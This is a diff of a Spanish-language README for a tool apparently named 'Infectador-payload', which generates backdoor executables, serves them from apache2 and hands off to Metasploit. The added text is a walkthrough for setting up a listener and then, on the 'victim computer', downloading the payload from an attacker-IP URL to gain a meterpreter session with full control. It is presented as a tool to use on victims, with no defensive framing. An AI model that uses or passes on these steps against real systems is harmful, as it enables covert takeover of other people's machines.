@@ -1,9 +1,13 @@
 # Infectador-payload
 Herramienta perfecta para crear cargas utiles (Backdoors) a una alta velocidad, esta herramienta preside de diferentes opciones, incluiendo la opcion de poder subir tu carga util a un servidor web (apache2).
 
-INTERFAZ: Grafica
-IMPORTANTE: Para utilizar esta herramieta debes tener conocimientos medios en Linux ya que sino no sabras que es lo que estas haciendo.
-HERRAMIENTA: Automatizada
+![backdoor](https://user-images.githubusercontent.com/69093629/104139012-b4ed6500-53a8-11eb-933c-95a869b21c6a.png)
+
+- **INTERFAZ: Grafica**
+
+- **IMPORTANTE: Para utilizar esta herramieta debes tener conocimientos medios en Linux ya que sino no sabras que es lo que estas haciendo.**
+
+- **HERRAMIENTA: Automatizada**
 
 ## Pre-requisitos 📋
 
@@ -73,3 +77,26 @@ Una vez elegidas las opciones de preferencia a utilizar, hay que escribir el 'LH
 Y se empezará a crear el Backdoor satisfactoriamente...
 
 ![video2](https://user-images.githubusercontent.com/69093629/104136537-2cb29400-5397-11eb-8d1d-3ffdea3bd598.gif)
+
+Una vez termine de crearse la carga util nos hara dos preguntas la primera es '¿Quieres eliminar el Backdoor...?' le pondremos que no de lo contrario 
+nos lo eliminara y tendremos que crear uno de nuevo, la segunda es '¿Quieres iniciar Metasploit?' aqui puedes o poner que si o abrir una nueva terminal y abrirlo manualmente.
+
+![Captura de pantalla (42)](https://user-images.githubusercontent.com/69093629/104138852-61c6e280-53a7-11eb-806e-595e7e76e1f7.png)
+
+Una vez todo hecho quedaria algo asi: 
+
+![Captura de pantalla (42)](https://user-images.githubusercontent.com/69093629/104138832-275d4580-53a7-11eb-8ba0-76d317e35bca.png)
+
+Ahora solo faltaria copiar la seccion que pone 'COPIE Y PEGUE ESTO EN METASPLOIT' lo copiamos y lo pegamos o lo hacemos manualmente, una vez hecho se nos quedaria en escucha nuestra carga util. Ahora iremos a nuestro ordenador victima y instalaremos la carga util de esta manera ``` http://[IP ATACANTE]/[nombre.exe] ``` 
+
+![Captura de pantalla (46)](https://user-images.githubusercontent.com/69093629/104138953-355f9600-53a8-11eb-8fbb-5cd5825e6b06.png)
+
+Una vez el Backdoor instalado a nuestro ordenador victima le llegara una conexion 'meterpreter' eso quiere decir que ya tendremos control total del ordenador victima.
+
+![Captura de pantalla (46)](https://user-images.githubusercontent.com/69093629/104138953-355f9600-53a8-11eb-8fbb-5cd5825e6b06.png)
+
+¡Dejame una ★ si te ha servido!
+
+
+
+
